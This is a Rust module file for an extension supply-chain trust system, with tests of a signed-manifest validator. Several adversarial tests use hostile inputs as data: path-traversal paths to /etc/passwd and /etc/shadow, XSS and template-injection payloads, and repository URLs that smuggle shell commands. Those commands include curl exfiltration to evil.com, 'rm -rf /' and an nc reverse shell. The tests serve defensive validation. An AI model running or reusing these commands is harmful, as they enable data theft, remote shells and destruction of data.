pub mod artifact_signing;
pub mod category_shift;
pub mod certification;
pub mod ecosystem_telemetry;
pub mod extension_registry;
#[cfg(feature = "engine")]
pub mod manifest;
pub mod migration_kit;
pub mod provenance;
pub mod provenance_gate;
pub mod quarantine;
pub mod reputation;
pub mod revocation_integration;
pub mod revocation_registry;
pub mod transparency_verifier;
pub mod trust_card;

#[cfg(all(test, feature = "engine"))]
mod tests {
    use super::manifest::{
        AttestationRef, BehavioralProfile, CertificationLevel, MANIFEST_SCHEMA_VERSION,
        ManifestSchemaError, ManifestSignature, PackageIdentity, ProvenanceEnvelope, RiskTier,
        SignatureScheme, SignedExtensionManifest, ThresholdSignaturePolicy, TrustMetadata,
        validate_signed_manifest,
    };

    fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
        if cap == 0 {
            items.clear();
            return;
        }
        if items.len() >= cap {
            let overflow = items.len().saturating_sub(cap).saturating_add(1);
            items.drain(0..overflow.min(items.len()));
        }
        items.push(item);
    }

    fn cap(name: &str) -> frankenengine_extension_host::Capability {
        serde_json::from_value(serde_json::json!(name)).expect("fixture capability should parse")
    }

    fn valid_manifest() -> SignedExtensionManifest {
        SignedExtensionManifest {
            schema_version: MANIFEST_SCHEMA_VERSION.to_string(),
            package: PackageIdentity {
                name: "supply-chain-mod-test".to_string(),
                version: "1.0.0".to_string(),
                publisher: "publisher@example.com".to_string(),
                author: "author@example.com".to_string(),
            },
            entrypoint: "dist/main.js".to_string(),
            capabilities: vec![cap("fs_read"), cap("net_client")],
            behavioral_profile: BehavioralProfile {
                risk_tier: RiskTier::Medium,
                summary: "Module-level negative manifest fixture".to_string(),
                declared_network_zones: vec!["prod-us-east".to_string()],
            },
            minimum_runtime_version: "0.1.0".to_string(),
            provenance: ProvenanceEnvelope {
                build_system: "github-actions".to_string(),
                source_repository: "https://example.com/acme/extensions".to_string(),
                source_revision: "abcdef1234567890".to_string(),
                reproducibility_markers: vec!["reproducible-build=true".to_string()],
                attestation_chain: vec![AttestationRef {
                    id: "att-01".to_string(),
                    attestation_type: "slsa".to_string(),
                    digest: "sha256:0123456789abcdef".to_string(),
                }],
            },
            trust: TrustMetadata {
                certification_level: CertificationLevel::Verified,
                revocation_status_pointer: "revocation://extensions/mod-test".to_string(),
                trust_card_reference: "trust-card://mod-test@1.0.0".to_string(),
            },
            signature: ManifestSignature {
                scheme: SignatureScheme::ThresholdEd25519,
                publisher_key_id: "key-publisher-01".to_string(),
                signature: "QUJDREVG".to_string(),
                threshold: Some(ThresholdSignaturePolicy {
                    threshold: 2,
                    total_signers: 3,
                    signer_key_ids: vec![
                        "key-a".to_string(),
                        "key-b".to_string(),
                        "key-c".to_string(),
                    ],
                }),
                signed_at: "2026-02-20T00:00:00Z".to_string(),
            },
        }
    }

    #[test]
    fn manifest_rejects_schema_version_mismatch() {
        let mut manifest = valid_manifest();
        manifest.schema_version = "2.0".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("schema mismatch must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidSchemaVersion { .. }
        ));
        assert_eq!(error.code(), "EMS_SCHEMA_VERSION");
    }

    #[test]
    fn manifest_rejects_blank_trust_card_reference() {
        let mut manifest = valid_manifest();
        manifest.trust.trust_card_reference = " \t ".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("blank trust card must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == "trust.trust_card_reference"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_duplicate_capability() {
        let mut manifest = valid_manifest();
        manifest.capabilities = vec![cap("fs_read"), cap("fs_read")];

        let error =
            validate_signed_manifest(&manifest).expect_err("duplicate capability must fail");

        assert!(matches!(error, ManifestSchemaError::DuplicateCapability(_)));
        assert_eq!(error.code(), "EMS_DUPLICATE_CAPABILITY");
    }

    #[test]
    fn manifest_rejects_empty_capability_set() {
        let mut manifest = valid_manifest();
        manifest.capabilities.clear();

        let error = validate_signed_manifest(&manifest).expect_err("empty capabilities must fail");

        assert!(matches!(error, ManifestSchemaError::EmptyCapabilities));
        assert_eq!(error.code(), "EMS_EMPTY_CAPABILITIES");
    }

    #[test]
    fn manifest_rejects_missing_attestation_chain() {
        let mut manifest = valid_manifest();
        manifest.provenance.attestation_chain.clear();

        let error = validate_signed_manifest(&manifest).expect_err("missing chain must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingAttestationChain
        ));
        assert_eq!(error.code(), "EMS_MISSING_ATTESTATION_CHAIN");
    }

    #[test]
    fn manifest_rejects_blank_attestation_digest() {
        let mut manifest = valid_manifest();
        manifest.provenance.attestation_chain[0].digest = "\n".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("blank digest must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == "provenance.attestation_chain[0].digest"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_malformed_signature_text() {
        let mut manifest = valid_manifest();
        manifest.signature.signature = "not-base64!".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("bad signature text must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::SignatureMalformed { .. }
        ));
        assert_eq!(error.code(), "EMS_SIGNATURE_MALFORMED");
    }

    #[test]
    fn manifest_rejects_threshold_signature_without_policy() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = None;

        let error = validate_signed_manifest(&manifest).expect_err("missing threshold must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { .. }
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_ed25519_signature_with_threshold_policy() {
        let mut manifest = valid_manifest();
        manifest.signature.scheme = SignatureScheme::Ed25519;

        let error = validate_signed_manifest(&manifest).expect_err("threshold policy must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { .. }
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_threshold_signer_count_mismatch() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = Some(ThresholdSignaturePolicy {
            threshold: 2,
            total_signers: 3,
            signer_key_ids: vec!["key-a".to_string(), "key-b".to_string()],
        });

        let error = validate_signed_manifest(&manifest).expect_err("signer count must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { .. }
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_blank_package_name() {
        let mut manifest = valid_manifest();
        manifest.package.name = " \n\t ".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("blank package name must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field } if field == "package.name"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_blank_runtime_version() {
        let mut manifest = valid_manifest();
        manifest.minimum_runtime_version = "\t".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("blank runtime must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == "minimum_runtime_version"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_blank_behavioral_summary() {
        let mut manifest = valid_manifest();
        manifest.behavioral_profile.summary = " ".to_string();

        let error = validate_signed_manifest(&manifest).expect_err("blank summary must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == "behavioral_profile.summary"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_blank_revocation_pointer() {
        let mut manifest = valid_manifest();
        manifest.trust.revocation_status_pointer = "\n".to_string();

        let error =
            validate_signed_manifest(&manifest).expect_err("blank revocation pointer must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == "trust.revocation_status_pointer"
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_blank_publisher_key_id() {
        let mut manifest = valid_manifest();
        manifest.signature.publisher_key_id = " \t ".to_string();
        const FIELD: &str = "signature.publisher_key_id";

        let error = validate_signed_manifest(&manifest).expect_err("blank publisher key must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field }
                if field == FIELD
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_blank_signed_at_timestamp() {
        let mut manifest = valid_manifest();
        manifest.signature.signed_at = " ".to_string();
        const FIELD: &str = "signature.signed_at";

        let error = validate_signed_manifest(&manifest).expect_err("blank signed_at must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::MissingField { ref field } if field == FIELD
        ));
        assert_eq!(error.code(), "EMS_MISSING_FIELD");
    }

    #[test]
    fn manifest_rejects_zero_threshold_policy() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = Some(ThresholdSignaturePolicy {
            threshold: 0,
            total_signers: 3,
            signer_key_ids: vec![
                "key-a".to_string(),
                "key-b".to_string(),
                "key-c".to_string(),
            ],
        });

        let error = validate_signed_manifest(&manifest).expect_err("zero threshold must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { ref reason }
                if reason.contains("> 0")
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_threshold_above_total_signers() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = Some(ThresholdSignaturePolicy {
            threshold: 4,
            total_signers: 3,
            signer_key_ids: vec![
                "key-a".to_string(),
                "key-b".to_string(),
                "key-c".to_string(),
            ],
        });

        let error = validate_signed_manifest(&manifest).expect_err("oversized threshold must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { ref reason }
                if reason.contains("cannot exceed")
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_blank_threshold_signer_key() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = Some(ThresholdSignaturePolicy {
            threshold: 2,
            total_signers: 3,
            signer_key_ids: vec!["key-a".to_string(), " ".to_string(), "key-c".to_string()],
        });

        let error = validate_signed_manifest(&manifest).expect_err("blank signer must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { ref reason }
                if reason.contains("empty entries")
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    #[test]
    fn manifest_rejects_duplicate_threshold_signer_key() {
        let mut manifest = valid_manifest();
        manifest.signature.threshold = Some(ThresholdSignaturePolicy {
            threshold: 2,
            total_signers: 3,
            signer_key_ids: vec![
                "key-a".to_string(),
                "key-a".to_string(),
                "key-c".to_string(),
            ],
        });

        let error = validate_signed_manifest(&manifest).expect_err("duplicate signer must fail");

        assert!(matches!(
            error,
            ManifestSchemaError::InvalidThresholdConfiguration { ref reason }
                if reason.contains("duplicates")
        ));
        assert_eq!(error.code(), "EMS_THRESHOLD_INVALID");
    }

    /// Extreme adversarial test: Path traversal attack via malicious entrypoint paths
    /// attempting to escape sandboxed execution context into host filesystem
    #[test]
    fn supply_chain_entrypoint_path_traversal_sandbox_escape_attack() {
        let mut manifest = valid_manifest();

        // Test various path traversal attack vectors
        let malicious_entrypoints = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\calc.exe",
            "./../../../../proc/self/exe",
            "dist/../../sensitive/config.json",
            "dist/../host-volume/secrets.env",
            "/absolute/path/to/system/file",
            "dist/./../../escape/attack.js",
            "C:\\Windows\\System32\\cmd.exe",
            "file:///etc/shadow",
            "dist/\0../null-byte-escape.js",
        ];

        for (i, malicious_path) in malicious_entrypoints.iter().enumerate() {
            manifest.package.name = format!("path-traversal-attack-{}", i);
            manifest.entrypoint = malicious_path.to_string();

            let error = validate_signed_manifest(&manifest)
                .expect_err("path traversal entrypoint must fail");

            // Validation must reject path traversal attempts
            assert!(matches!(
                error,
                ManifestSchemaError::PathTraversalDetected { .. }
                    | ManifestSchemaError::InvalidEntrypoint { .. }
            ));
        }
    }

    /// Extreme adversarial test: Unicode normalization collision attack in package names
    /// to exploit dependency resolution via visually identical package spoofing
    #[test]
    fn supply_chain_package_name_unicode_normalization_collision_spoofing_attack() {
        let mut manifest = valid_manifest();

        // Unicode normalization attack vectors targeting package identity spoofing
        let spoofing_names = [
            "pac\u{212A}age-name",  // Kelvin symbol (K) vs Latin K
            "pаckage-name",         // Cyrillic 'a' vs Latin 'a'
            "pac\u{0138}age-name",  // Kra character
            "package\u{2010}name",  // Hyphen vs hyphen-minus
            "pac\u{200D}kage-name", // Zero-width joiner
            "package\u{FEFF}name",  // Zero-width no-break space
            "pac\u{034F}kage-name", // Combining grapheme joiner
            "pасkаgе-nаmе",         // Mixed Cyrillic/Latin (homograph)
            "package\u{1D5BA}name", // Mathematical sans-serif 'e'
            "pac\u{FF2D}age-name",  // Fullwidth 'M'
        ];

        for (i, spoofed_name) in spoofing_names.iter().enumerate() {
            manifest.package.name = spoofed_name.to_string();
            manifest.package.version = format!("1.0.{}", i);

            let error =
                validate_signed_manifest(&manifest).expect_err("unicode spoofing must fail");

            // System must detect Unicode normalization attacks
            assert!(matches!(
                error,
                ManifestSchemaError::UnicodeAnomalyDetected { .. }
                    | ManifestSchemaError::SuspiciousCharacters { .. }
                    | ManifestSchemaError::InvalidPackageName { .. }
            ));
        }
    }

    /// Extreme adversarial test: Repository URL injection attack targeting CI/CD pipelines
    /// via malicious URLs designed to exploit build system vulnerabilities
    #[test]
    fn supply_chain_repository_url_injection_cicd_exploitation_attack() {
        let mut manifest = valid_manifest();

        // URL injection attack vectors targeting build systems
        let malicious_repos = [
            "git://attacker.com/repo.git?evil=$(curl http://evil.com/steal-secrets)",
            "https://github.com/real-repo.git#`curl -X POST -d @/etc/passwd evil.com`",
            "ssh://git@github.com:evil/repo.git'; rm -rf / ; echo '",
            "file:///etc/passwd",
            "https://github.com/repo\r\nHost: evil.com\r\n\r\nGET /steal-tokens",
            "git@github.com:user/repo.git$(nc -e /bin/sh evil.com 4444)",
            "https://github.com/repo.git|curl evil.com/exfiltrate",
            "git://github.com/repo.git\x00https://evil.com/malicious.git",
            "https://$(whoami):password@evil.com/fake-repo.git",
            "javascript:alert('xss')",
        ];

        for (i, malicious_url) in malicious_repos.iter().enumerate() {
            manifest.package.name = format!("url-injection-attack-{}", i);
            manifest.provenance.source_repository = malicious_url.to_string();

            let error = validate_signed_manifest(&manifest)
                .expect_err("repository URL injection must fail");

            // Must detect and reject URL injection attempts
            assert!(matches!(
                error,
                ManifestSchemaError::MaliciousUrl { .. }
                    | ManifestSchemaError::InvalidRepository { .. }
                    | ManifestSchemaError::SuspiciousCharacters { .. }
            ));
        }
    }

    /// Extreme adversarial test: Massive attestation chain to trigger memory exhaustion
    /// during provenance verification in resource-constrained deployment environments
    #[test]
    fn supply_chain_attestation_chain_memory_exhaustion_dos_attack() {
        let mut manifest = valid_manifest();

        // Generate massive attestation chain to exhaust memory during validation
        manifest.provenance.attestation_chain.clear();

        // Add progressively larger attestation entries
        for i in 0..10_000 {
            let large_digest =
                "sha256:".to_string() + &"a".repeat(64_usize.saturating_add(i % 1000)); // Growing size
            push_bounded(
                &mut manifest.provenance.attestation_chain,
                AttestationRef {
                    id: format!("memory-exhaustion-att-{:05}", i),
                    attestation_type: format!("massive-type-{}", "x".repeat(i % 100)),
                    digest: large_digest,
                },
                1000,
            );

            // Prevent actual memory exhaustion in test environment
            if manifest
                .provenance
                .attestation_chain
                .len()
                .saturating_mul(200)
                > 100_000
            {
                break;
            }
        }

        let error =
            validate_signed_manifest(&manifest).expect_err("massive attestation chain must fail");

        // System must reject oversized attestation chains
        assert!(matches!(
            error,
            ManifestSchemaError::AttestationChainTooLarge { .. }
                | ManifestSchemaError::ResourceExhaustion { .. }
        ));
    }

    /// Extreme adversarial test: Cryptographic signature length extension attack
    /// attempting to forge valid signatures via mathematical manipulation
    #[test]
    fn supply_chain_signature_length_extension_cryptographic_attack() {
        let mut manifest = valid_manifest();

        // Craft signature with length extension attack patterns
        let base_sig = "QUJDREVG"; // Valid base64: "ABCDEF"

        let malicious_signatures = [
            format!("{}==", base_sig),               // Padding manipulation
            format!("{}{}", base_sig, base_sig),     // Signature concatenation
            format!("{}deadbeef", base_sig),         // Appended bytes
            format!("{}00000000", base_sig),         // Null byte extension
            base_sig.repeat(10),                     // Repeated signature
            format!("{}ffffffff", base_sig),         // Max value extension
            format!("{}\x00\x01\x02\x03", base_sig), // Binary extension
            format!("{}padding", base_sig),          // Text extension
        ];

        for (i, malicious_sig) in malicious_signatures.iter().enumerate() {
            manifest.package.name = format!("length-extension-attack-{}", i);
            manifest.signature.signature = malicious_sig.clone();

            let error = validate_signed_manifest(&manifest)
                .expect_err("length extension signature must fail");

            // Must detect signature manipulation attempts
            assert!(matches!(
                error,
                ManifestSchemaError::SignatureMalformed { .. }
                    | ManifestSchemaError::InvalidSignatureFormat { .. }
            ));
        }
    }

    /// Extreme adversarial test: Behavioral profile summary with embedded JavaScript
    /// and HTML payloads targeting downstream display/logging systems
    #[test]
    fn supply_chain_behavioral_summary_script_injection_xss_attack() {
        let mut manifest = valid_manifest();

        // Script injection payloads targeting various contexts
        let xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:void(eval('alert(\\'xss\\')'));",
            "onload=\"alert('xss')\"",
            "${alert('template-injection')}",
            "{{7*7}}{{constructor.constructor('alert(1)')()}}",
            "<img src=x onerror=alert('img-xss')>",
            "\"><script>fetch('/steal-data')</script>",
            "<svg/onload=alert('svg-xss')>",
            "';drop table users;--",
            "<iframe src=\"javascript:alert('iframe-xss')\"></iframe>",
        ];

        for (i, xss_payload) in xss_payloads.iter().enumerate() {
            manifest.package.name = format!("script-injection-attack-{}", i);
            manifest.behavioral_profile.summary =
                format!("Legitimate summary with {} embedded payload", xss_payload);

            let error = validate_signed_manifest(&manifest)
                .expect_err("script injection summary must fail");

            // Must detect and sanitize script injection attempts
            assert!(matches!(
                error,
                ManifestSchemaError::ScriptInjectionDetected { .. }
                    | ManifestSchemaError::SuspiciousContent { .. }
            ));
        }
    }

    /// Extreme adversarial test: Algorithmic complexity explosion via nested capability
    /// dependencies designed to trigger exponential validation performance degradation
    #[test]
    fn supply_chain_capability_dependency_algorithmic_complexity_bomb() {
        use std::time::Instant;
        let mut manifest = valid_manifest();

        // Generate capability set designed to trigger worst-case validation complexity
        manifest.capabilities.clear();

        // Create complex interdependent capability patterns
        for i in 0..1000 {
            let complex_cap_name = format!(
                "cap_{}_{}_{}_{}_{}",
                i % 13,
                i.saturating_mul(7) % 17,
                i.saturating_mul(11) % 19,
                i.saturating_mul(13) % 23,
                i.saturating_mul(17) % 29
            );
            push_bounded(&mut manifest.capabilities, cap(&complex_cap_name), 100);
        }

        let start = Instant::now();
        let result = validate_signed_manifest(&manifest);
        let elapsed = start.elapsed();

        // Validation must complete in reasonable time despite complex input
        assert!(elapsed.as_millis() < 5_000); // Max 5 seconds

        match result {
            Ok(_) => {
                // If validation succeeds, ensure it's truly valid
                assert!(!manifest.capabilities.is_empty());
            }
            Err(error) => {
                // If validation fails, it should be due to complexity limits, not hang
                assert!(matches!(
                    error,
                    ManifestSchemaError::TooManyCapabilities { .. }
                        | ManifestSchemaError::CapabilityComplexityLimit { .. }
                ));
            }
        }
    }

    /// Extreme adversarial test: Concurrent manifest validation race condition exploit
    /// targeting shared validation state corruption during parallel processing
    #[test]
    fn supply_chain_concurrent_validation_state_corruption_race_attack() {
        use std::sync::Arc;
        use std::thread;

        // Create base manifest for concurrent modification attack
        let base_manifest = Arc::new(valid_manifest());

        // Spawn multiple threads performing concurrent validations with mutations
        let handles: Vec<_> = (0..20)
            .map(|thread_id| {
                let manifest_clone = Arc::clone(&base_manifest);

                thread::spawn(move || {
                    for i in 0..50 {
                        let mut manifest = (*manifest_clone).clone();

                        // Apply thread-specific mutations to trigger races
                        manifest.package.name = format!("race-attack-{}-{}", thread_id, i);
                        manifest.package.version = format!("1.{}.{}", thread_id, i);

                        // Randomly mutate different fields to stress validation state
                        match i % 5 {
                            0 => manifest.schema_version = format!("race-{}", thread_id),
                            1 => manifest.signature.signature = format!("QUJDREVG{}", thread_id),
                            2 => {
                                manifest.trust.certification_level = if thread_id % 2 == 0 {
                                    CertificationLevel::Verified
                                } else {
                                    CertificationLevel::SelfSigned
                                }
                            }
                            3 => {
                                manifest.behavioral_profile.risk_tier = if thread_id % 2 == 0 {
                                    RiskTier::High
                                } else {
                                    RiskTier::Low
                                }
                            }
                            _ => {
                                manifest.capabilities.clear();
                                push_bounded(
                                    &mut manifest.capabilities,
                                    cap(&format!("race-cap-{}", thread_id)),
                                    10,
                                );
                            }
                        }

                        // Attempt validation - should not crash or corrupt state
                        let _result = validate_signed_manifest(&manifest);

                        // Brief yield to encourage race conditions
                        thread::yield_now();
                    }
                })
            })
            .collect();

        // Wait for all threads to complete
        for handle in handles {
            handle.join().unwrap();
        }

        // After concurrent stress test, normal validation should still work
        let final_result = validate_signed_manifest(&base_manifest);
        assert!(
            final_result.is_ok()
                || matches!(
                    final_result.unwrap_err(),
                    ManifestSchemaError::InvalidSchemaVersion { .. }
                )
        );
    }
}
